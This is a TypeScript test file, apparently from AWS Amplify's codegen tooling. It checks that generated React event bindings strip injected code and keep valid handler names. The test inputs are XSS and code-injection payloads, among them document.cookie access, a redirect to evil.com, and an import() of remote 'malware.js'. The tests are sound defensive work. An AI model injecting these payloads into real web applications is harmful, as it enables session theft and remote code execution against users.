/*
  Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.

  Licensed under the Apache License, Version 2.0 (the "License").
  You may not use this file except in compliance with the License.
  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
 */
import { BoundStudioComponentEvent } from '@aws-amplify/codegen-ui';
import { buildBindingEvent, buildOpeningElementEvents, mapGenericEventToReact } from '../../workflow/events';
import { assertASTMatchesSnapshot } from '../__utils__';
import { Primitive } from '../../primitive';

describe('buildBindingEvent', () => {
  it('should sanitize eval injection in bindingEvent', () => {
    const event: BoundStudioComponentEvent = {
      bindingEvent: "eval('alert(document.domain)')",
    };

    const result = buildBindingEvent('Button', event, 'onClick');
    // The identifier text should be empty after sanitization
    const jsxExpr = (result as any).initializer;
    expect(jsxExpr.expression.escapedText).toBe('');
  });

  it('should sanitize document.cookie access in bindingEvent', () => {
    const event: BoundStudioComponentEvent = {
      bindingEvent: 'document.cookie',
    };

    const result = buildBindingEvent('Button', event, 'onClick');
    const jsxExpr = (result as any).initializer;
    expect(jsxExpr.expression.escapedText).toBe('');
  });

  it('should sanitize window.location injection in bindingEvent', () => {
    const event: BoundStudioComponentEvent = {
      bindingEvent: "window.location='http://evil.com'",
    };

    const result = buildBindingEvent('Button', event, 'onClick');
    const jsxExpr = (result as any).initializer;
    expect(jsxExpr.expression.escapedText).toBe('');
  });

  it('should sanitize javascript: protocol in bindingEvent', () => {
    const event: BoundStudioComponentEvent = {
      // eslint-disable-next-line no-script-url
      bindingEvent: 'javascript:alert(1)',
    };

    const result = buildBindingEvent('Button', event, 'onClick');
    const jsxExpr = (result as any).initializer;
    expect(jsxExpr.expression.escapedText).toBe('');
  });

  it('should sanitize script tag injection in bindingEvent', () => {
    const event: BoundStudioComponentEvent = {
      bindingEvent: '<script>alert(1)</script>',
    };

    const result = buildBindingEvent('Button', event, 'onClick');
    const jsxExpr = (result as any).initializer;
    expect(jsxExpr.expression.escapedText).toBe('');
  });

  it('should sanitize Function constructor in bindingEvent', () => {
    const event: BoundStudioComponentEvent = {
      bindingEvent: "new Function('return this')()",
    };

    const result = buildBindingEvent('Button', event, 'onClick');
    const jsxExpr = (result as any).initializer;
    expect(jsxExpr.expression.escapedText).toBe('');
  });

  it('should sanitize setTimeout injection in bindingEvent', () => {
    const event: BoundStudioComponentEvent = {
      bindingEvent: "setTimeout('alert(1)',0)",
    };

    const result = buildBindingEvent('Button', event, 'onClick');
    const jsxExpr = (result as any).initializer;
    expect(jsxExpr.expression.escapedText).toBe('');
  });

  it('should sanitize template literal attack in bindingEvent', () => {
    const event: BoundStudioComponentEvent = {
      // eslint-disable-next-line no-template-curly-in-string
      bindingEvent: '${alert(1)}',
    };

    const result = buildBindingEvent('Button', event, 'onClick');
    const jsxExpr = (result as any).initializer;
    expect(jsxExpr.expression.escapedText).toBe('');
  });

  it('should sanitize __proto__ pollution in bindingEvent', () => {
    const event: BoundStudioComponentEvent = {
      bindingEvent: '__proto__.polluted',
    };

    const result = buildBindingEvent('Button', event, 'onClick');
    const jsxExpr = (result as any).initializer;
    expect(jsxExpr.expression.escapedText).toBe('');
  });

  it('should sanitize import() in bindingEvent', () => {
    const event: BoundStudioComponentEvent = {
      bindingEvent: "import('http://evil.com/malware.js')",
    };

    const result = buildBindingEvent('Button', event, 'onClick');
    const jsxExpr = (result as any).initializer;
    expect(jsxExpr.expression.escapedText).toBe('');
  });

  it('should allow valid handler name in bindingEvent', () => {
    const event: BoundStudioComponentEvent = {
      bindingEvent: 'handleClick',
    };

    const result = buildBindingEvent('Button', event, 'onClick');
    const jsxExpr = (result as any).initializer;
    expect(jsxExpr.expression.escapedText).toBe('handleClick');
  });

  it('should allow valid camelCase handler in bindingEvent', () => {
    const event: BoundStudioComponentEvent = {
      bindingEvent: 'onButtonClickHandler',
    };

    const result = buildBindingEvent('Button', event, 'onClick');
    const jsxExpr = (result as any).initializer;
    expect(jsxExpr.expression.escapedText).toBe('onButtonClickHandler');
  });

  it('should escape reserved keyword in bindingEvent', () => {
    const event: BoundStudioComponentEvent = {
      bindingEvent: 'class',
    };

    const result = buildBindingEvent('Button', event, 'onClick');
    const jsxExpr = (result as any).initializer;
    expect(jsxExpr.expression.escapedText).toBe('classProp');
  });

  it('should generate correct JSX attribute name from generic event', () => {
    const event: BoundStudioComponentEvent = {
      bindingEvent: 'handleClick',
    };

    const result = buildBindingEvent('Button', event, 'onClick');
    expect((result as any).name.escapedText).toBe('onClick');
  });

  it('should generate snapshot for safe binding event', () => {
    const event: BoundStudioComponentEvent = {
      bindingEvent: 'handleSubmit',
    };

    assertASTMatchesSnapshot(buildBindingEvent('Button', event, 'onClick'));
  });

  it('should generate snapshot for sanitized malicious binding event', () => {
    const event: BoundStudioComponentEvent = {
      bindingEvent: "eval('alert(1)')",
    };

    assertASTMatchesSnapshot(buildBindingEvent('Button', event, 'onClick'));
  });
});

describe('buildOpeningElementEvents', () => {
  it('should sanitize bound event with malicious bindingEvent', () => {
    const event: BoundStudioComponentEvent = {
      bindingEvent: "eval('alert(document.domain)')",
    };

    const result = buildOpeningElementEvents('Button', event, 'onClick', 'MyButton');
    const jsxExpr = (result as any).initializer;
    expect(jsxExpr.expression.escapedText).toBe('');
  });

  it('should pass through safe bound event', () => {
    const event: BoundStudioComponentEvent = {
      bindingEvent: 'handleClick',
    };

    const result = buildOpeningElementEvents('Button', event, 'onClick', 'MyButton');
    const jsxExpr = (result as any).initializer;
    expect(jsxExpr.expression.escapedText).toBe('handleClick');
  });
});

describe('mapGenericEventToReact', () => {
  it('should map onClick correctly', () => {
    expect(mapGenericEventToReact('Button' as Primitive, 'onClick' as any)).toBe('onClick');
  });

  it('should apply StepperField override for onChange', () => {
    expect(mapGenericEventToReact('StepperField' as Primitive, 'onChange' as any)).toBe('onStepChange');
  });

  it('should throw for invalid event', () => {
    expect(() => mapGenericEventToReact('Button' as Primitive, 'onInvalid' as any)).toThrow(
      'onInvalid is not a possible event.',
    );
  });
});
